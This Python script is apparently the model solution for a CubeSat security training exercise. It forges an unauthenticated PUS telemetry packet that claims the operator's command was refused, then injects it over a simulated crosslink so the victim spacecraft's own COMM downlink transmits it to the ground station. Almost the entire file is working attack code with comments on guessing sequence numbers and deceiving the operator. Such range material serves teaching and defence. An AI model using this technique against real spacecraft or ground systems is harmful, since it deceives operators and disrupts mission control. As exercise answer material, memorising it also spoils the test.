#!/usr/bin/env python3
"""EX-D01 model solution: tell the operator their command was refused.

Every other solver here attacks the spacecraft. This one attacks the OPERATOR, and it needs
nothing the spacecraft would have to accept - because the frame it forges never goes to the
spacecraft at all.

COMM's downlink task binds CSP port 10, accepts a connection from ANY source, and frames whatever
arrives into a TM transfer frame. It even logs the source node and does not check it. So a peer on
the crosslink can hand the victim's own COMM a telemetry packet and have it transmitted, signed by
nothing, on the operator's own downlink.

What comes out the other end is a PUS 1,2 acceptance failure: the right APID, the right sequence
number, the right destination station, and a plausible reason. EX-G04 built that report so the
ground could hear a refusal instead of guessing at silence. Nobody authenticated it.

Usage:
    python3 exercises/EX-D01-a-refusal-nobody-sent/solve.py [--code N] [--seq N]
"""
import argparse
import socket
import sys
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO / "src"))

from cuberange import ports                                       # noqa: E402
from cuberange.gs.station import PUS_TM_TIME_LEN                  # noqa: E402
from cuberange.identity import GROUND_STATIONS, spacecraft        # noqa: E402
from cuberange.proto.csp import encode_packet                     # noqa: E402
from cuberange.proto.pus import (FAILURE_NAMES, FAILURE_NOT_AUTHORISED,   # noqa: E402
                                 PusTm, request_id,
                                 SERVICE_VERIFICATION, SUBTYPE_ACCEPTANCE_FAILURE)
from cuberange.proto.spacepacket import PacketType, SpacePacket   # noqa: E402

CSP_PORT_PUS, SPORT = 10, 20
VICTIM, PEER = 0, 1


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--code", type=int, default=FAILURE_NOT_AUTHORISED,
                    help=f"failure code to claim ({', '.join(f'{k}={v}' for k, v in FAILURE_NAMES.items())})")
    ap.add_argument("--seq", type=int, default=0,
                    help="the sequence number of the command to blame; 0 is the operator's first")
    ap.add_argument("--station", default="primary", help="which operator to lie to")
    ap.add_argument("--port", type=int, default=None, help="crosslink injector port")
    args = ap.parse_args()

    victim, peer = spacecraft(VICTIM), spacecraft(PEER)
    dest = GROUND_STATIONS[args.station]

    #: The request id is the refused packet's own first four octets, which the ground matches
    #: against its own log. An attacker guesses it - and the first command of a pass is seq 0.
    app = request_id(victim.apid, args.seq) + bytes([args.code])
    tm = PusTm(service=SERVICE_VERIFICATION, subtype=SUBTYPE_ACCEPTANCE_FAILURE, dest_id=dest,
               time=bytes(PUS_TM_TIME_LEN), app_data=app)
    packet = SpacePacket(apid=victim.apid, ptype=PacketType.TM, sec_hdr=True, seq_count=0,
                         data=tm.encode()).encode()

    print(f"claiming: APID 0x{victim.apid:03X} seq {args.seq} refused - "
          f"{FAILURE_NAMES.get(args.code, args.code)}, to station 0x{dest:04X}")
    print(f"  {packet.hex()}")
    print("  no trailer, because none is required of telemetry - that is the whole exercise")

    #: To the VICTIM's COMM, not its OBC. COMM's downlink task will frame this and transmit it.
    frames = encode_packet(src=peer.comm, dst=victim.comm, dport=CSP_PORT_PUS, sport=SPORT,
                           payload=packet)
    port = args.port if args.port is not None else ports.crosslink_injector()
    sock = socket.create_connection(("127.0.0.1", port), timeout=5)
    try:
        for f in frames:
            sock.sendall(f"{f.can_id:x} {f.data.hex()}\n".encode())
            print(f"  injected {f.hex()}")
    finally:
        sock.close()
    print("  watch the operator's console, and the OBC's - one of them will have nothing to say")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
